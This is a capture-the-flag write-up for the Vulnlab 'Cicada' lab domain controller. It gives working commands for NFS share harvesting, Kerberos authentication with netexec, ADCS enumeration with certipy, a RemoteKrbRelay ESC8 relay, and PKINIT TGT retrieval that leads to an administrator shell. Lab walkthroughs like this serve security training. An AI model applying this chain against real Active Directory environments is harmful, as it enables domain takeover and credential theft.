
# Vulnlab - Cicada


```bash                                               
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0        
|_http-title: IIS Windows Server                          
| http-methods:                                   
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-11 18:09:49Z)
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-13T10:42:50
| Not valid after:  2025-09-13T10:42:50
| MD5:   2b54:f7f1:53c6:0241:c432:c868:1d86:5ec7
|_SHA-1: eef8:12f9:0a11:c0d5:16c1:c499:9abf:3341:4419:6a2b
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-13T10:42:50
| Not valid after:  2025-09-13T10:42:50
| MD5:   2b54:f7f1:53c6:0241:c432:c868:1d86:5ec7
|_SHA-1: eef8:12f9:0a11:c0d5:16c1:c499:9abf:3341:4419:6a2b
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs           2-4 (RPC #100003)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa
| Public Key bits: 2048
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-13T10:42:50
| Not valid after:  2025-09-13T10:42:50
| MD5:   2b54:f7f1:53c6:0241:c432:c868:1d86:5ec7
|_SHA-1: eef8:12f9:0a11:c0d5:16c1:c499:9abf:3341:4419:6a2b
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-11T18:11:17+00:00; +9s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-09-12T15:21:57
| Not valid after:  2025-03-14T15:21:57
| MD5:   e356:22df:9b7a:d588:46f6:a65e:3788:73e1
|_SHA-1: d206:e12e:961c:9184:3789:b9fd:c616:4942:c661:7ae7
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
```

Visiting the page as we have port 80 open, we get nothing but IIS default page

<img src="https://i.imgur.com/MJXrB7z.png"/>

# Enumerating shares

Next we can enumerate smb and nfs share while being unauthenticated, from smb we get an error message, so it might not be accessible without credentials or it's just NTLM authentication is disabled and only kerberos is allowed 

<img src="https://i.imgur.com/Q57PJy7.png"/>

With `showmount` we can list the directories that are available to be mapped from our host

<img src="https://i.imgur.com/n8SlJqe.png"/>

```bash
sudo mount -t nfs 10.10.89.234:/profiles  /home/arz/Vulnlabs/Cicada/share
```

<img src="https://i.imgur.com/c6j55lB.png"/>

From this share, we get home directories of domain users from which we can explore and create a list of users that maybe helpful in as-rep roasting or password spraying

<img src="https://i.imgur.com/oYCUxXO.png"/>

In administrator's directory, we have `vacation.png` file

<img src="https://i.imgur.com/el1PDyZ.png"/>

The image doesn't hold anything meaningful 

<img src="https://i.imgur.com/PUQm2yy.png"/>

However, from `Rosie.Powell`'s directory we have another image, `marketing.png`

<img src="https://i.imgur.com/50fwwBy.png"/>

This image holds a password, so we can try this on Rosie since it was in this user's directory

<img src="https://i.imgur.com/KT4Lzbi.png"/>

<img src="https://i.imgur.com/x807eFw.png"/>
But when enumerating the shares through netexec we'll be shown an error of "not supported"

<img src="https://i.imgur.com/BkNXSV2.png"/>

## Authenticating with kerberos

We saw the same error earlier with smbclient, so to authenticate with kerbeors just add `-k` as an argument also add the machine name which was found through nmap in hosts file

<img src="https://i.imgur.com/oLAX5QB.png"/>

```bash
nxc smb DC-JPQ225 -u 'Rosie.Powell' -d cicada.vl -p password -k 
```

<img src="https://i.imgur.com/7WZWAUx.png"/>

Alternatively we can use `getTGT` from impacket and `smbclient` to enumerate shares

<img src="https://i.imgur.com/qLj7x7U.png"/>

We already went through `profiles$` share as it was available for mounting on nfs, there's `CertEnroll` which means this server is also ADCS (Active Directory Certificate Services), we can enumerate for enabled/vulnerable certificate templates through `certipy` 

```bash
certipy-ad find -u 'Rosie.Powell' -vulnerable -stdout -k -no-pass -target DC-JPQ225
```

<img src="https://i.imgur.com/Sr8bOnf.png"/>

# Performing kerberos Relay with ESC8 

The output shows that web enrollment is enabled which is found very common to be vulnerable as relaying NTLM authentication is possible to the web enrollment service by coercing HTTP authentication  request for a certificate on behalf of domain controller but here we only have only one server also NTLM authentication is disabled from what we saw and self relaying isn't possible

It's possible to add a machine account if the quota allows us, this can be checked with netexec

<img src="https://i.imgur.com/EC28xqQ.png"/>

We can add a machine account by first spinning up a windows VM, connecting it to vulnlab's vpn, adding domain controller's IP as the DNS server and join it with the domain

<img src="https://i.imgur.com/mpgX0gz.png"/>

Set the DNS IP to domain controller

<img src="https://i.imgur.com/XpXWsHY.png"/>

To join this to a domain, go to `control panel`, `system` and then `reanme this pc (advanced)`

<img src="https://i.imgur.com/gBslSpA.png"/>

<img src="https://i.imgur.com/OppFho8.png"/>

<img src="https://i.imgur.com/KWDrwAs.png"/>


<img src="https://i.imgur.com/1zgA2Nt.png"/>

Now to perform kerberos realy on ADCS web enrollment, A tool called RemoteKrbRelay can be used which is similar to Krbrealyup except that this can be used to perform kerberos relay remotely instead of doing it locally 

<img src="https://i.imgur.com/obOyK1O.jpeg"/>

I do want to point an issue I faced, don't know if this was only with me but after compiling and running it, visual studio wasn't including `BouncyCastle` so the binary would scream for not having that dependency included

<img src="https://i.imgur.com/gCVkY2s.png"/>

This isn't a big issue as we can just place the dll in the folder from where we are executing the binary and it should work

```bash
RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3
```

<img src="https://i.imgur.com/CqgKPOy.png"/>

Copying the base64 pfx certificate, with `PKINIT tools` , we can request the NThash or TGT of domain controller and then use it to dump hash of domain admin

```bash
python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 $(cat ./cert.pkcs12) -dc-ip IP cicada.vl/'DC-JPQ225$' dc.ccache
```

<img src="https://i.imgur.com/Og5HbwY.png"/>

<img src="https://i.imgur.com/2iEzIrc.png"/>

Retrieving TGT of administrator and then getting a shell through wmiexec

<img src="https://i.imgur.com/7tK6hKZ.png"/>

# References

- https://x.com/decoder_it/status/1842180729695842676
- https://github.com/CICADA8-Research/RemoteKrbRelay
